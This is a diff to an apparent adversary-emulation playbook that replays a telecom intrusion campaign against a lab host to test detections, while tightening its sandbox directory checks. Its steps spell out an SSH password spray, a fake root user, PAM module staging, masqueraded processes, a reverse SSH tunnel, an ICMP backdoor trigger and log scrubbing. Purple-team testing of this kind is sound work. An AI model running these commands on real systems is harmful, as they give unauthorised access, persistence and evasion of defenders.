@@ -180,7 +180,7 @@ steps:
     name: "SSH dictionary attempts with default-account names against the lab host"
     command: |
       LAB=/var/tmp/.cortexsim-mp033
-      mkdir -p "$LAB"
+      rm -rf /var/tmp/.cortexsim-mp033 && mkdir -m 700 /var/tmp/.cortexsim-mp033 || { echo "sandbox /var/tmp/.cortexsim-mp033 could not be created fresh: something else is at that path" >&2; exit 1; }
       for u in root admin operator support maint guest; do
         timeout 6 ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
           -o PreferredAuthentications=password,keyboard-interactive "$u@${STAGE_HOST:-127.0.0.1}" true >/dev/null 2>&1
@@ -200,6 +200,7 @@ steps:
   - id: step-02
     name: "Privilege-escalation residue — DirtyCoW temp user firefart created then removed, PwnKit stand-in staged"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       mkdir -p "$LAB/priv"
       printf 'cortexsim-mp033 inert PwnKit stand-in (pslogs), not an ELF\n' > "$LAB/priv/pslogs"
@@ -226,6 +227,7 @@ steps:
   - id: step-03
     name: "AuthDoor staging — a pam_unix.so written by cp, credential log /usr/bin/.dbus.log, timestomped"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       mkdir -p "$LAB/lib/security"
       SRC=$(find /lib /lib64 /usr/lib /usr/lib64 -name pam_unix.so 2>/dev/null | head -n 1)
@@ -254,6 +256,7 @@ steps:
   - id: step-04
     name: "Masqueraded tooling — dbus-* stand-ins dropped, a [kpqd] process kept alive by watchdogdd"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       mkdir -p "$LAB/bin"
       for n in dbusquery dbus-socks dbus-console httpdd evip-echo cupsd; do
@@ -287,6 +290,7 @@ steps:
   - id: step-05
     name: "GTPDoor shape — a dnsd_el5-named listener on UDP 2123 receives a GTPv1-C echo request"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       mkdir -p "$LAB/bin"
       cat > "$LAB/bin/gtpc-listen" <<'SH'
@@ -317,6 +321,7 @@ steps:
   - id: step-06
     name: "EchoBackdoor / NoDepDNS shape — 14-byte fixed-pattern ICMP echoes and the GTP-node DNS trigger"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       ping -c 3 -s 14 -p 66756e6e79416e644861707079 "${STAGE_HOST:-127.0.0.1}" > "$LAB/icmp.log" 2>&1 || true
       cat "$LAB/icmp.log"
@@ -338,6 +343,7 @@ steps:
   - id: step-07
     name: "sshtun shape — reverse SSH tunnel exposing local port 22 via remote port 53 on the lab host"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       timeout 8 ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
         -o ExitOnForwardFailure=yes -N -R 2222:127.0.0.1:22 -p 53 "tunnel@${STAGE_HOST:-127.0.0.1}" > "$LAB/sshtun.log" 2>&1
@@ -361,12 +367,13 @@ steps:
   - id: step-08
     name: "NGFW leg — WildFire threat logs for five C2-delivered tools (report sha256s)"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=$(hostname -I | awk '{print $1}')
       SRC_HOST=$(hostname -s)
       SRC_USER=$(id -un)
-      cat > /tmp/mp-033-threat.yml <<YML
+      cat > "$C/mp-033-threat.yml" <<YML
       campaign_id: CMP-MP-THREAT-033
       name: "CL-STA-0969 telecom — WildFire verdicts on the delivered Linux toolkit"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -437,7 +444,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-033-threat.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-033-threat.yml" --live
     identity: root
     mitre_technique: "T1105"
     causality:
@@ -464,12 +471,13 @@ steps:
   - id: step-09
     name: "NGFW leg — rare SSH session record for the run host (preset destination, un-enrichable)"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=$(hostname -I | awk '{print $1}')
       SRC_HOST=$(hostname -s)
       SRC_USER=$(id -un)
-      cat > /tmp/mp-033-ssh.yml <<YML
+      cat > "$C/mp-033-ssh.yml" <<YML
       campaign_id: CMP-MP-SSH-033
       name: "CL-STA-0969 telecom — rare outbound SSH tunnel session (NGFW EAL)"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -490,7 +498,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-033-ssh.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-033-ssh.yml" --live
     identity: root
     mitre_technique: "T1021.004"
     causality:
@@ -507,6 +515,7 @@ steps:
   - id: step-10
     name: "Cover tracks — scrub a wtmp copy with utmpdump, null HISTFILE, timestomp the dropped tools"
     command: |
+      [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp033 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp033 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       LAB=/var/tmp/.cortexsim-mp033
       export HISTFILE=/dev/null
       if [ -r /var/log/wtmp ] && command -v utmpdump >/dev/null 2>&1; then
@@ -541,7 +550,7 @@ steps:
 cleanup:
   commands:
     - "pkill -f '^\\[kpqd\\]' || true; pkill -f '^dnsd_el5' || true; if getent passwd firefart | grep -q cortexsim-mp033; then userdel firefart; fi"
-    - "if [ -e /var/tmp/.cortexsim-mp033/.dbus-log-created ]; then rm -f /usr/bin/.dbus.log; fi; rm -f /tmp/mp-033-threat.yml /tmp/mp-033-ssh.yml && rm -rf /var/tmp/.cortexsim-mp033"
+    - "if [ -e /var/tmp/.cortexsim-mp033/.dbus-log-created ]; then rm -f /usr/bin/.dbus.log; fi; rm -rf /var/tmp/.cortexsim-mp033"
 
 author: "Henry Reed"
 created: "2026-10-27"
